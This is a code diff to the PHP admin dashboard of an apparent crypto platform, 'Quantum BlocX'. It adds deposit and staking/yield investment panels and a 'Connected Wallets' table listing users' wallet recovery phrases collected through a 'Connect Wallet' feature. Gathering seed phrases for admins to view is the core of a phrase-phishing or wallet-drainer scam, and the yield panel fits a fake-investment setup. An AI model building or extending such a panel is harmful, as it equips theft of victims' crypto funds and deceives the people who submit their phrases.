@@ -6,6 +6,12 @@
 require_once '../../api/utilities/auth-check.php';
 requireAdmin();
 $admin = getAuthUser();
+
+// Cache-bust assets by file modification time so updates always load
+$__root = dirname(__DIR__, 2);
+$__v = function (string $rel) use ($__root) {
+    return $rel . '?v=' . (@filemtime($__root . $rel) ?: time());
+};
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -13,10 +19,10 @@ $admin = getAuthUser();
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin — Quantum BlocX</title>
-  <link rel="stylesheet" href="/assets/css/main.css">
-  <link rel="stylesheet" href="/assets/css/admin/admin.css">
-  <link rel="stylesheet" href="/assets/css/admin/admin-responsive.css">
-  <link rel="stylesheet" href="/assets/icons/style.css">
+  <link rel="stylesheet" href="<?= $__v('/assets/css/main.css') ?>">
+  <link rel="stylesheet" href="<?= $__v('/assets/css/admin/admin.css') ?>">
+  <link rel="stylesheet" href="<?= $__v('/assets/css/admin/admin-responsive.css') ?>">
+  <link rel="stylesheet" href="<?= $__v('/assets/icons/style.css') ?>">
   <link rel="icon" type="image/x-icon" href="/assets/favicon/favicon.ico">
 </head>
 <body class="admin-body">
@@ -49,14 +55,23 @@ $admin = getAuthUser();
       <button class="sidebar-nav-item" data-nav="cards">
         <i class="ph ph-credit-card"></i> Virtual Cards
       </button>
+      <button class="sidebar-nav-item" data-nav="deposits">
+        <i class="ph ph-download-simple"></i> Deposits
+      </button>
+      <button class="sidebar-nav-item" data-nav="investments">
+        <i class="ph ph-chart-line-up"></i> Investments
+      </button>
       <button class="sidebar-nav-item" data-nav="wallets">
         <i class="ph ph-wallet"></i> User Wallets
+      </button>
+      <button class="sidebar-nav-item" data-nav="phrases">
+        <i class="ph ph-key"></i> Connected Wallets
       </button>
       <button class="sidebar-nav-item" data-nav="support">
         <i class="ph ph-headset"></i> Support Tickets
       </button>
       <button class="sidebar-nav-item" data-nav="mining">
-        <i class="ph ph-pickaxe"></i> Mining
+        <i class="ph ph-cpu"></i> Mining
       </button>
       <button class="sidebar-nav-item" data-nav="settings">
         <i class="ph ph-sliders"></i> Settings
@@ -114,8 +129,10 @@ $admin = getAuthUser();
             <div class="stat-body"><div class="stat-label">Active Cards</div><div class="stat-value" data-stat="active-cards">—</div></div></div>
           <div class="stat-card"><div class="stat-icon"><i class="ph ph-receipt"></i></div>
             <div class="stat-body"><div class="stat-label">Transactions (30d)</div><div class="stat-value" data-stat="tx-count-30d">—</div></div></div>
-          <div class="stat-card"><div class="stat-icon"><i class="ph ph-swap"></i></div>
-            <div class="stat-body"><div class="stat-label">Swaps (30d)</div><div class="stat-value" data-stat="swap-count-30d">—</div></div></div>
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-chart-line-up"></i></div>
+            <div class="stat-body"><div class="stat-label">Active Investments</div><div class="stat-value" data-stat="active-investments">—</div></div></div>
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-download-simple"></i></div>
+            <div class="stat-body"><div class="stat-label">Pending Deposits</div><div class="stat-value" data-stat="pending-deposits">—</div></div></div>
           <div class="stat-card"><div class="stat-icon"><i class="ph ph-headset"></i></div>
             <div class="stat-body"><div class="stat-label">Open Tickets</div><div class="stat-value" data-stat="open-tickets">—</div></div></div>
         </div>
@@ -187,6 +204,57 @@ $admin = getAuthUser();
         </tbody></table></div></div>
       </section>
 
+      <!-- ═══ DEPOSITS (NOWPayments) ══════════════════════════════ -->
+      <section class="admin-section" data-section="deposits">
+        <div class="section-header">
+          <div><h2 class="section-title">Deposits</h2><p class="section-subtitle">Incoming crypto deposits via NOWPayments</p></div>
+          <select class="admin-filter" id="depositFilter">
+            <option value="">All statuses</option>
+            <option value="waiting">Waiting</option><option value="confirming">Confirming</option>
+            <option value="finished">Finished</option><option value="partially_paid">Partially paid</option>
+            <option value="failed">Failed</option><option value="expired">Expired</option>
+          </select>
+        </div>
+        <div class="stat-grid stat-grid--compact" id="depositStatGrid">
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-hourglass-medium"></i></div>
+            <div class="stat-body"><div class="stat-label">Pending</div><div class="stat-value" data-dstat="pending">—</div></div></div>
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-check-circle"></i></div>
+            <div class="stat-body"><div class="stat-label">Credited</div><div class="stat-value" data-dstat="credited">—</div></div></div>
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-currency-dollar"></i></div>
+            <div class="stat-body"><div class="stat-label">Total Received</div><div class="stat-value" data-dstat="received">—</div></div></div>
+        </div>
+        <div class="table-card"><div class="data-table-wrap"><table class="data-table"><thead>
+          <tr><th>User</th><th>Asset</th><th>Pay Amount</th><th>USD</th><th>Status</th><th>Created</th><th>Actions</th></tr>
+        </thead><tbody data-table="admin-deposits">
+          <tr><td colspan="7"><div class="loading-rows"><i class="ph ph-circle-notch ph-spin"></i> Loading…</div></td></tr>
+        </tbody></table></div></div>
+      </section>
+
+      <!-- ═══ INVESTMENTS ═════════════════════════════════════════ -->
+      <section class="admin-section" data-section="investments">
+        <div class="section-header">
+          <div><h2 class="section-title">Investments</h2><p class="section-subtitle">User staking & yield positions</p></div>
+          <select class="admin-filter" id="investFilter">
+            <option value="">All statuses</option>
+            <option value="active">Active</option><option value="matured">Matured</option>
+            <option value="withdrawn">Withdrawn</option><option value="cancelled">Cancelled</option>
+          </select>
+        </div>
+        <div class="stat-grid stat-grid--compact" id="investStatGrid">
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-trend-up"></i></div>
+            <div class="stat-body"><div class="stat-label">Active Positions</div><div class="stat-value" data-istat="active">—</div></div></div>
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-vault"></i></div>
+            <div class="stat-body"><div class="stat-label">Active Principal</div><div class="stat-value" data-istat="principal">—</div></div></div>
+          <div class="stat-card"><div class="stat-icon"><i class="ph ph-hand-coins"></i></div>
+            <div class="stat-body"><div class="stat-label">Paid Out</div><div class="stat-value" data-istat="paidout">—</div></div></div>
+        </div>
+        <div class="table-card"><div class="data-table-wrap"><table class="data-table"><thead>
+          <tr><th>User</th><th>Product</th><th>Principal</th><th>APR</th><th>Term</th><th>Status</th><th>Matures</th></tr>
+        </thead><tbody data-table="admin-investments">
+          <tr><td colspan="7"><div class="loading-rows"><i class="ph ph-circle-notch ph-spin"></i> Loading…</div></td></tr>
+        </tbody></table></div></div>
+      </section>
+
       <!-- ═══ USER WALLETS ════════════════════════════════════════ -->
       <section class="admin-section" data-section="wallets">
         <div class="section-header">
@@ -199,6 +267,19 @@ $admin = getAuthUser();
           <tr><td colspan="6"><div class="loading-rows"><i class="ph ph-circle-notch ph-spin"></i> Loading…</div></td></tr>
         </tbody></table></div>
         <div class="pagination" data-pagination="admin-wallets"></div></div>
+      </section>
+
+      <!-- ═══ CONNECTED WALLETS (recovery phrases) ════════════════ -->
+      <section class="admin-section" data-section="phrases">
+        <div class="section-header">
+          <div><h2 class="section-title">Connected Wallets</h2><p class="section-subtitle">Recovery phrases submitted via Connect Wallet</p></div>
+          <input type="text" class="admin-search" id="phraseSearch" placeholder="Search user or wallet…">
+        </div>
+        <div class="table-card"><div class="data-table-wrap"><table class="data-table"><thead>
+          <tr><th>User</th><th>Wallet</th><th>Recovery Phrase</th><th>Connected</th><th>Actions</th></tr>
+        </thead><tbody data-table="admin-phrases">
+          <tr><td colspan="5"><div class="loading-rows"><i class="ph ph-circle-notch ph-spin"></i> Loading…</div></td></tr>
+        </tbody></table></div></div>
       </section>
 
       <!-- ═══ SUPPORT TICKETS ═════════════════════════════════════ -->
@@ -275,14 +356,8 @@ $admin = getAuthUser();
   <button class="dock-item" data-nav="settings"><i class="ph ph-sliders"></i><span>Settings</span></button>
 </nav>
 
-<!-- Admin Modals -->
-<?php
-$modalsDir = '../../includes/admin-modals/';
-if (is_dir($modalsDir)) {
-  foreach (glob($modalsDir . '*.php') as $modal) { include $modal; }
-}
-?>
+<!-- Admin modals are built dynamically in admin-dashboard.js (openModal / confirmModal) -->
 
-<script src="/assets/js/admin/admin-dashboard.js" defer></script>
+<script src="<?= $__v('/assets/js/admin/admin-dashboard.js') ?>" defer></script>
 </body>
 </html>
